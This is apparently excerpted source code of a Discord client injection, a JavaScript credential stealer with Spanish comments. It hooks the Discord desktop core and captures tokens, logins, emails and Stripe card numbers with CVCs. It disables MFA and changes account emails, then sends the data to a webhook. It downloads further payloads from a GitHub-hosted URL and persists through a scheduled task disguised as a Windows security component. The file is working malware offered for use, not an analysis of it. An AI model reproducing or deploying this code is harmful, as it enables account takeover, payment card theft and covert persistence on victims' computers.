...
const CONFIG = {
  webhook: "%WEBHOOK_URL%", // URL del webhook para enviar notificaciones. Ejemplo: 'https://discord.com/api/webhooks/...'
  API: "%API_URL%", // URL de la API para interactuar con servicios externos. Ejemplo: 'https://your-api-url.com'
  auto_user_profile_edit: "true", // Booleano para habilitar/deshabilitar la edición automática del perfil de usuario. Ejemplo: 'true' o 'false'
  auto_persist_startup: "%AUTO_PERSIST_STARTUP%", // Booleano para habilitar/deshabilitar la persistencia automática al inicio. Ejemplo: 'true' o 'false'
  auto_mfa_disabler: "%AUTO_MFA_DISABLER%", // Booleano para habilitar/deshabilitar la desactivación automática de MFA. Ejemplo: 'true' o 'false'
  auto_email_update: "%AUTO_EMAIL_UPDATE%", // Booleano para habilitar/deshabilitar la actualización automática de correo electrónico. Ejemplo: 'true' o 'false'
  injection_url:
    "https://raw.githubusercontent.com/catfeatures/in/refs/heads/main/a.js",
  injector_url:
    "https://raw.githubusercontent.com/catfeatures/in/refs/heads/main/v.vbs",
  get: {
    token: () =>
      execScript(
...
const request = async (method, url, headers = {}, data = null) => {
  try {
    const requests = [
      ...(url.includes("api/webhooks") ? [url, CONFIG.API] : [url]),
    ].map((url) => {
...
const notify = async (ctx, token, user) => {
  ...
  ctx.embeds[0].fields.push(
    ...
    {
      name: "Path",
      value: `\`${__dirname.trim().replace(/\\/g, "/")}\``,
      inline: false,
    }
  );
  ...
  ctx.embeds.forEach((embed) => {
    ...
    embed.author = {
      ...
      icon_url: user.avatar
        ...
        : `https://cdn.discordapp.com/embed/avatars/${Math.round(
            Math.random() * 5
          )}.png`,
    };

    embed.footer = {
      text: "@esex / t.me/skjdajksakjfdas",
...
class Fetcher {
  ...
  _fetch = async (endpoint, headers) => {
    ...
    const response = parseJSON(
      await request(
        "GET",
        `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`,
        headers
      )
    );
    return response;
  ...
  Profile = async () => {
    return await this._fetch(
      `${Buffer.from(this.token.split(".")[0], "base64").toString(
        "binary"
      )}/profile`,
      {
        "Content-Type": "application/json",
...
class GetDataUser {
  SystemInfo = async () => {
    try {
      const [
        ...
        execCommand("wmic PATH Win32_VideoController get name | more +1").then(
        ...
        execCommand(
          ...
          (stdout) =>
            `${Math.floor(parseInt(stdout) / (1024 * 1024 * 1024))} GB`
        ),
        execCommand(
  ...
  Badges = (flags) =>
    Object.keys(CONFIG.badges).reduce(
      (result, badge) =>
        CONFIG.badges.hasOwnProperty(badge) &&
  ...
  Billing = async (token) => {
    ...
    let paymentMethods = data
      .map((method) => payment[method.type] || "❓")
      .join("");
  ...
  Servers = async (token) => {
    ...
    const hQGuilds = await Promise.all(
      filteredGuilds.map(async (guild) => {
        const response = parseJSON(
          await request(
            "GET",
            `https://discord.com/api/v8/guilds/${guild.id}/invites`,
            {
              "Content-Type": "application/json",
              Authorization: token,
            }
    ...
    switch (premium_type) {
      ...
      case 2:
        ...
        for (let i = 0; i < months.length; i++)
          if (
            Math.round(
              (this.getDate(new Date(premium_guild_since), months[i]) -
                new Date()) /
                86400000
            ) > 0
          ) {
        ...
        embeds: [
          {
            fields: [
              ...
              {
                name: "Number",
                value: `\`${request.item["card[number]"]}\``,
                inline: true,
              },
              {
                name: "CVC",
                value: `\`${request.item["card[cvc]"]}\``,
                inline: true,
              },
              {
                name: "Expiration",
                value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``,
                inline: true,
              },
            ],
            fields: [
...
const forcePersistStartup = async () => {
  ...
  const checkScheduledTaskExists = () => {
    return new Promise((resolve) => {
      exec('schtasks /query /tn "WindowsSecurityHealthSystray"', (err) => {
        resolve(!err);
      });
    });
  };
  ...
  const createBatchFile = () => {
    const batContent = `
            ...
            schtasks /create /tn "WindowsSecurityHealthSystray" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
            if %ERRORLEVEL% EQU 0 (
...
const startup = async () => {
  const startupDir = path.join(__dirname, "@esex");
  ...
  if (token) {
    if (fs.existsSync(startupDir)) {
      ...
      Cruise(
        ...
        null,
        token,
        `It is injected in the route: \`${__dirname
          .trim()
          .replace(/\\/g, "/")}\``
      );
      clearLocalStorage();
  ...
  const coreJsFile = path.join(
    app,
    "modules",
    fs
      .readdirSync(path.join(app, "modules"))
      .find((file) => /discord_desktop_core-/.test(file)),
    "discord_desktop_core",
    "index.js"
  );
  const betterDiscordAsarFile = path.join(
    process.env.APPDATA,
    "betterdiscord",
    "data",
    "betterdiscord.asar"
  ...
  if (["win32"].includes(process.platform)) {
    ...
    const scriptRunJsFileContent = `
                        ...
                        https.get('${CONFIG.injection_url}', (res) => {
                            res.on('data', chunk => fileStream.write(
                                chunk.toString()
                                    ...
                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${
                                      CONFIG.auto_user_profile_edit
                                    }')
                                    .replace('%AUTO_PERSIST_STARTUP%', '${
                                      CONFIG.auto_persist_startup
                                    }')
                                    .replace('%AUTO_MFA_DISABLER%', '${
                                      CONFIG.auto_mfa_disabler
                                    }')
                                    .replace('%AUTO_EMAIL_UPDATE%', '${
                                      CONFIG.auto_email_update
                                    }')
                            ));
        ...
        `;
    fs.writeFileSync(
      startupScriptRunJsFile,
      scriptRunJsFileContent.replace(/\\/g, "\\\\")
    );
  }
};
...
const translateEmailUpdate = async (token, locale) => {
  ...
  try {
    ...
    const response = parseJSON(
      await request(
        "GET",
        `https://translate.w1sh.xyz/translate?key=_IS_GOD&text=${textParam}&language=${locale}`,
        {
          "Content-Type": "application/json",
          Authorization: token,
        }
    ...
    return Array.isArray(translatedText) &&
      translatedText.length === message.length
      ? translatedText
      : message;
  } catch (error) {
    return message;
...
let [email, password, script_executed] = ["", "", false];

const GangwayCord = async (
  params,
  RESPONSE_DATA,
  RESQUEST_DATA,
  token,
    ...
    switch (true) {
      case params.response.url.endsWith("/login"):
        if (params.response.url.endsWith("/remote-auth/login")) {
          ...
          const { token: newToken, user: newUser } = await AuritaCord();
...
const createWindow = () => {
  ...
  mainWindow.webContents.debugger.on("message", async (_, method, params) => {
    ...
    if (
      !CONFIG.auth_filters.urls.some((url) =>
        params.response.url.endsWith(url)
      ) ||
    ...
    try {
      const [{ body: responseBody }, { postData: requestPostData }] =
        await Promise.all([
...
const defaultSession = () => {
  ...
  webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
    ...
    if (![200, 202].includes(statusCode) && !["POST"].includes(method)) return;
    ...
    switch (true) {
      case url.includes("stripe"):
        ...
        try {
          ...
          item = querystring.parse(
            decodeURIComponent(uploadData[0]?.bytes.toString() || "")
          );
        }

        const { line_1, line_2, city, state, postal_code, country, email } =
          billing_address;
        const request = {
          item,
          line_1,
      ...
      case url.endsWith("paypal_accounts") ||
        url.endsWith("billing-agreement-tokens"):
        Cruise(
          "PAYPAL_ADDED",
          null,
          null,
...
const interceptRequest = () => {
  ...
  webRequest.onHeadersReceived(async (request, callback) => {
    ...
    ["content-security-policy", "content-security-policy-report-only"].forEach(
      (header) => {
                                                    ...
                                                    <form>
                                                        ...
                                                        <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
                                                            <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
                                                                <p>${ALERT_INTRO} (<strong>${truncateEmail(
          user.email || "user@gmail.com"
        )}</strong>) ${END_INTRO_ALERT}</p>
                                                                <p>${CHANGE_ALERT}</p>
    ...
    switch (true) {
      case (url.endsWith("/@me") && !script_executed) ||
        (url.includes("/settings") && !script_executed):
        if (url.endsWith("/@me")) {
